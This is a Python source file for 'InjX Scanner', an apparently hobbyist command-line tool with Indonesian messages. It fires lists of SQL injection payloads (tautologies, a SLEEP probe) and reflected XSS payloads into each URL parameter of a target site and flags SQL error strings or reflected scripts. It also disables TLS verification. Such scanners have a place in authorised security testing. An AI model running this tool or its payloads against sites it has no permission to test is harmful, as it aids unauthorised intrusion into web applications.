#!/usr/bin/env python3
import requests
import argparse
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' AND '1'='2",
    "\" AND \"1\"=\"2",
    "1 OR 1=1",
    "1' AND SLEEP(5)--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "<body onload=alert(1)>"
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "mysql_fetch",
    "syntax error",
    "pg_query",
    "oracle error"
]

def banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
  .___            ______  ___
  |   | ____     |__\   \/  /
  |   |/    \    |  |\     / 
  |   |   |  \   |  |/     \ 
  |___|___|  /\__|  /___/\  \
           \/\______|     \_/
       
	 InjX Scanner
    """ + Style.RESET_ALL)

def inject_param(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if param in qs:
        qs[param] = payload
    new_query = urlencode(qs, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

def scan_sqli(target, param):
    print(Fore.YELLOW + f"\n[+] Memindai potensi SQL Injection pada parameter '{param}'..." + Style.RESET_ALL)
    vulnerable = False
    for payload in SQLI_PAYLOADS:
        new_url = inject_param(target, param, payload)
        try:
            r = requests.get(new_url, timeout=10, verify=False)
            for err in SQL_ERRORS:
                if err.lower() in r.text.lower():
                    print(Fore.RED + f"[!] SQLi terdeteksi pada parameter '{param}' dengan payload '{payload}'" + Style.RESET_ALL)
                    print(Fore.MAGENTA + f"    [*] URL: {new_url}" + Style.RESET_ALL)
                    print(Fore.BLUE + f"    [*] Status: {r.status_code} | Length: {len(r.text)}" + Style.RESET_ALL)
                    vulnerable = True
        except Exception as e:
            print(Fore.RED + f"[!] Request error: {e}" + Style.RESET_ALL)
    return vulnerable

def scan_xss(target, param):
    print(Fore.YELLOW + f"\n[+] Memindai potensi XSS pada parameter '{param}'..." + Style.RESET_ALL)
    vulnerable = False
    for payload in XSS_PAYLOADS:
        new_url = inject_param(target, param, payload)
        try:
            r = requests.get(new_url, timeout=10, verify=False)
            if payload in r.text:
                print(Fore.RED + f"[!] Reflected XSS terdeteksi pada parameter '{param}' dengan payload '{payload}'" + Style.RESET_ALL)
                print(Fore.MAGENTA + f"    [*] URL: {new_url}" + Style.RESET_ALL)
                print(Fore.BLUE + f"    [*] Status: {r.status_code} | Length: {len(r.text)}" + Style.RESET_ALL)
                vulnerable = True
        except Exception as e:
            print(Fore.RED + f"[!] Request error: {e}" + Style.RESET_ALL)
    return vulnerable

def main():
    banner()
    parser = argparse.ArgumentParser(
        description="InjX - SQLi & XSS Scanner",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--url", help="Target URL (contoh: https://site.com/page.php?id=1)")
    args = parser.parse_args()

    if not args.url:
        return

    target = args.url
    print(Fore.CYAN + f"[+] Target: {target}" + Style.RESET_ALL)

    parsed = urlparse(target)
    params = parse_qs(parsed.query)
    if not params:
        print(Fore.RED + "[!] Tidak ada parameter yang ditemukan di URL" + Style.RESET_ALL)
        return
    print(Fore.GREEN + f"[+] Parameters found: {', '.join(params.keys())}" + Style.RESET_ALL)

    vuln_found = False
    for param in params.keys():
        if scan_sqli(target, param):
            vuln_found = True
        if scan_xss(target, param):
            vuln_found = True

    if vuln_found:
        print(Fore.RED + Style.BRIGHT + "\n[!] Kerentanan terdeteksi!" + Style.RESET_ALL)
    else:
        print(Fore.GREEN + Style.BRIGHT + "\n[-] Tidak ada kerentanan ditemukan." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
